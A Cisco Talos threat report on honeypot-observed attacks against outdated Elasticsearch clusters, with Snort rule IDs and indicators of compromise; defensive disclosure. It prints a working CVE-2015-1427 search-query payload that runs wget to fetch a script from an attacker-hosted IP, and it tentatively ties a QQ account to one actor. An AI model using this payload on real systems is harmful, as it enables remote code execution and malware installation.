@@ -1,0 +1,191 @@
+
+
+
+
+
+
+
+
+
+
+
+Christopher Evans of Cisco Talos conducted the research for this post.
+
+
+
+Executive Summary
+
+Cisco Talos warns users that they need to keep a close eye on unsecured Elasticsearch clusters. We have recently observed a spike in attacks from multiple threat actors targeting these clusters. These attackers are targeting clusters using versions 1.4.2 and lower, and are leveraging old vulnerabilities to pass scripts to search queries and drop the attacker's payloads. These scripts are being leveraged to drop both malware and cryptocurrency miners on victim machines. Talos has also been able to identify social media accounts associated with one of these threat actors. Because Elasticsearch is typically used to manage very large datasets, the repercussions of a successful attack on a cluster could be devastating due to the amount of data present. This post details the attack methods used by each threat actor, as well as the associated payloads.
+
+
+Introduction
+
+Through ongoing analysis of honeypot traffic, Talos detected an increase in attacks targeting unsecured Elasticsearch clusters. These attacks leverage CVE-2014-3120 and CVE-2015-1427, both of which are only present in old versions of Elasticsearch and exploit the ability to pass scripts to search queries. Based on patterns in the payloads and exploit chains, Talos assesses with moderate confidence that six distinct actors are exploiting our honeypots.
+
+For example CVE-2015-1427:
+
+{
+  "size": 1,
+  "script_fields": {
+    "lupin": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/uuu.sh -P /tmp/sssooo\").getText()"
+    }
+  }
+}
+
+The most active of these actors consistently deploys two distinct payloads with the initial exploit, always using CVE-2015-1427. The first payload invokes wget to download a bash script, while the second payload uses obfuscated Java to invoke bash and download the same bash script with wget. This is likely an attempt to make the exploit work on a broader variety of platforms. The bash script utilized by the attacker follows a commonly observed pattern of disabling security protections and killing a variety of other malicious processes (primarily other mining malware), before placing its RSA key in the authorized_keys file. Additionally, this bash script serves to download illicit miners and their configuration files. The script achieves persistence by installing shell scripts as cron jobs.
+
+This bash script also downloads a UPX-packed ELF executable. Analysis of the unpacked sample reveals that this executable contains exploits for a variety of other systems. These additional exploits include several vulnerabilities, all of which could lead to remote code execution, such as CVE-2018-7600 in Drupal, CVE-2017-10271 in Oracle WebLogic, and CVE-2018-1273 in Spring Data Commons. The exploits are sent, typically via HTTPS, to the targeted systems. As evidenced by each of these exploits, the attacker's goal appears to be obtaining remote code execution on targeted machines. Detailed analysis of the payload sample is ongoing, and Talos will provide pertinent updates as necessary.
+
+Talos observed a second actor exploiting CVE-2014-3120, using it to deliver a payload that is derivative of the Bill Gates distributed denial-of-service malware. The reappearance of this malware is notable because, while Talos has previously observed this malware in our honeypots, the majority of actors have transitioned away from the DDoS malware and pivoted toward illicit miners.
+
+A third actor attempts to download a file named "LinuxT" from an HTTP file server using exploits targeting CVE-2014-3120. The LinuxT file is no longer hosted on the command and control (C2) server despite continued exploits requesting the file, although several other malicious files are still being hosted. All of these files are detected by ClamAV as variants of the Spike trojan and are intended to run on x86, MIPS and ARM architectures.
+
+As part of our research, we observed that, in some cases, hosts that attempted to download the "LinuxT" sample also dropped payloads that executed the command "echo 'qq952135763.'" This behavior has been seen in elastic search error logs going back several years. QQ is a popular Chinese social media website, and it is possible that this is referencing a QQ account. We briefly reviewed the public account activity of 952135763 and found several posts related to cybersecurity and exploitation, but nothing specific to this activity. While this information could potentially shed more light on the attacker, there is insufficient information currently to draw any firm conclusions.
+
+
+
+
+
+"About Me" page of the attacker's personal website linking to the same QQ account number as in the command above.
+
+
+This website also links to the potential attacker's Gitee page. Gitee is a Chinese code-sharing website similar to Github or Atlassian.
+
+
+
+
+
+Attacker's Gitee page.
+
+
+Although the projects associated with this Gitee profile are not explicitly malicious, Talos has linked this QQ account to a profile on Chinese hacking forum xiaoqi7, as well as a history of posts on topics related to exploits and malware on other forums. We briefly reviewed the public account activity of 952135763 and found several posts related to cyber security and exploitation, but nothing specific to this activity. While this information could tell us more about the attacker, there is insufficient information currently to draw any firm conclusions.
+
+Our honeypots also detected additional hosts exploiting Elasticsearch to drop payloads that execute both "echo 'qq952135763'" and "echo '952135763,'" suggesting that the attacks are related to the same QQ account. However, none of the IPs associated with these attacks have been observed attempting to download the "LinuxT" payload linked to this attacker. Additionally, unlike other activity associated with this attacker, these attacks leveraged the newer Elasticsearch vulnerability rather than the older one.
+
+The three remaining actors that Talos identified have not been observed delivering any malware through their exploits. One actor issued an "rm *" command, while the other two actors were fingerprinting vulnerable servers by issuing 'whoami' and 'id' commands.
+
+
+Conclusion
+
+Talos has observed multiple attackers exploiting CVE-2014-3120 and CVE-2015-1427 in our Elasticsearch honeypots to drop a variety of malicious payloads. Additionally, Talos has identified some social media accounts we believe could belong to the threat actor dropping the "LinuxT" payload. These Elasticsearch vulnerabilities only exist in versions 1.4.2 and lower, so any cluster running a modern version of Elasticsearch is unaffected by these vulnerabilities. Given the size and sensitivity of the data sets these clusters contain, the impact of a breach of this nature could be severe. Talos urges readers to patch and upgrade to a newer version of Elasticsearch if at all possible. Additionally, Talos highly recommends disabling the ability to send scripts through search queries if that ability is not strictly necessary for your use cases.
+
+
+Coverage
+
+The following SNORTⓇ rules will detect exploitation attempts. Note that additional rules may be released at a future date and current rules are subject to change pending additional vulnerability information. For the most current rule information, please refer to your Firepower Management Center or Snort.org.
+
+CVE-2014-3120: 33830, 36256, 44690
+
+CVE-2015-1427: 33814,36067
+
+CVE-2017-10271: 45304
+
+CVE-2018-7600: 46316
+
+CVE-2018-1273: 46473
+
+Additional ways our customers can detect and block this threat are listed below.
+
+
+
+
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
+
+Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.
+
+Email Security can block malicious emails sent by threat actors as part of their campaign.
+
+Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.
+
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.
+
+Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
+
+
+IOCs:
+
+First Actor:
+
+Attacking IP addresses:
+
+101[.]200[.]48[.]68
+117[.]205[.]7[.]194
+107[.]182[.]183[.]206
+124[.]43[.]19[.]159
+139[.]99[.]131[.]57
+179[.]50[.]196[.]228
+185[.]165[.]116[.]144
+189[.]201[.]192[.]242
+191[.]189[.]30[.]112
+192[.]210[.]198[.]50
+195[.]201[.]169[.]194
+216[.]15[.]146[.]34
+43[.]240[.]65[.]121
+45[.]76[.]136[.]196
+45[.]76[.]178[.]34
+52[.]8[.]60[.]118
+54[.]70[.]161[.]251
+139[.]159[.]218[.]82
+
+IP addresses and ports hosting malware:
+
+45[.]76[.]122[.]92:8506
+207[.]148[.]70[.]143:8506
+
+SHA256 of delivered malware:
+
+bbd6839074adea734213cc5e40a0dbb31c4c36df5a5bc1040757d6baec3f8415 e2f1be608c2cece021e68056f2897d88ed855bafd457e07e62533db6dfdc00dc
+191f1126f42b1b94ec248a7bbb60b354f2066b45287cd1bdb23bd39da7002a8c
+2bcc9fff40053ab356ddde6de55077f8bf83d8dfa6d129c250f521eb170dc123
+9a181c6a1748a9cfb46751a2cd2b27e3e742914873de40402b5d40f334d5448c 5fe3b0ba0680498dbf52fb8f0ffc316f3a4d7e8202b3ec710b2ae63e70c83b90
+7b08a8dae39049aecedd9679301805583a77a4271fddbafa105fa3b1b507baa3
+
+Second Actor:
+
+Attacking IP address:
+
+202[.]109[.]143[.]110
+
+IP address and port hosting malware:
+
+216[.]176[.]179[.]106:9090
+
+SHA256 of delivered malware:
+
+bbd6839074adea734213cc5e40a0dbb31c4c36df5a5bc1040757d6baec3f8415
+
+Third Actor:
+
+Attacking IP addresses:
+
+125[.]231[.]139[.]75
+36[.]235[.]171[.]244
+
+IP addresses linked to QQ account, but not delivering malware:
+
+121[.]207[.]227[.]84
+125[.]77[.]30[.]184
+
+IP address and port hosting malware:
+
+104[.]203[.]170[.]198:5522
+
+SHA256 of malware hosted on above IP address:
+
+7f18c8beb8e37ce41de1619b2d67eb600ace062e23ac5a5d9a9b2b3dfaccf79b dac92c84ccbb88f058b61deadb34a511e320affa7424f3951169cba50d700500 e5a04653a3bfbac53cbb40a8857f81c8ec70927a968cb62e32fd36143a6437fc d3447f001a6361c8454c9e560a6ca11e825ed17f63813074621846c43d6571ba 709d04dd39dd7f214f3711f7795337fbb1c2e837dddd24e6d426a0d6c306618e 830db6a2a6782812848f43a4e1229847d92a592671879ff849bc9cf08259ba6a
+
+Remaining actors:
+
+Attacking IP addresses:
+
+111[.]19[.]78[.]4
+15[.]231[.]235[.]194
+221[.]203[.]81[.]226
+111[.]73[.]45[.]90
+121[.]207[.]227[.]84
+125[.]77[.]30[.]184
+
+
+
